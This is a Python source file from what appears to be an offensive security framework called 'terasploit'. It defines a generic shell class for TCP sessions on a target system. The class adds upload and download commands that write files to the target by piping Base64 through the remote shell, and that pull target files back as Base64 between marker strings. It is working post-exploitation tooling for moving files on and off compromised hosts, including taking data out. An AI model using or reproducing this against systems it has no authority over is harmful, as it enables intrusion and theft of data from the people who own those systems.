import base64
import os

from extension.shell.base import BaseShell
from terasploit.ui.printf import error, info, success, warning
from terasploit.utils.exception import TerasploitShellError


class GenericShell(BaseShell):
    """Platform-agnostic shell for TCP sessions."""

    PLATFORM_LABEL = "Generic"

    def _handle_user_input(self, raw):
        """Intercept upload/download commands; pass everything else to BaseShell."""
        if not raw:
            super()._handle_user_input(raw)
            return

        command = raw.split()[0].lower()
        args = raw.split()
        if command == "upload":
            self.cmd_upload(args[1:])
        if command == "download":
            self.cmd_download(args[1:])

        super()._handle_user_input(raw)

    def cmd_upload(self, args):
        """Upload a local file to the target by piping Base64 through the shell."""
        if len(args) < 2:
            warning("Usage: upload <local_path> <remote_path>")
            return

        local_path, remote_path = args[0], args[1]
        if not os.path.isfile(local_path):
            error(f"Local file not found: {local_path}")
            return
        try:
            with open(local_path, "rb") as f:
                binary_data = f.read()

            encoded_str = base64.b64encode(binary_data).decode("utf-8")
            info(f"Uploading {len(binary_data)} bytes to {remote_path}...")

            safe_path = remote_path.replace("'", "'\\''")
            cmd = f"echo '{encoded_str}' | base64 -d > '{safe_path}'"

            if self._send(cmd):
                success(f"Upload dispatched → {remote_path}")
        except TerasploitShellError as exc:
            error(f"Failed to prepare upload: {exc}")

    def cmd_download(self, args):
        """Download a file from the target by reading its Base64-encoded output."""
        if not args:
            warning("Usage: download <remote_path> [local_path]")
            return

        remote_path = args[0]
        local_path = args[1] if len(args) > 1 else os.path.basename(remote_path)

        info(f"Initiating download: {remote_path} → {local_path}")
        if not self._start_transfer(local_path):
            return

        safe_remote = remote_path.replace("'", "'\\''")
        cmd = (
            f"printf '%s%s\\n' '---TERASPLOIT_' 'SHELL_SOF---'; base64 '{safe_remote}' 2>/dev/null; printf '%s%s\\n' '---TERASPLOIT_' 'SHELL_EOF---'"
        )
        if not self._send(cmd):
            self._stop_transfer()

    def _help_sections(self) -> list:
        base = super()._help_sections()
        # Insert Filesystem section between Core and Execution.
        filesystem = (
            "Filesystem",
            [
                ("upload <local> <remote>", "Upload a local file to the target"),
                ("download <remote> [local]", "Download a file from the target"),
            ],
        )
        return [base[0], filesystem, *base[1:]]
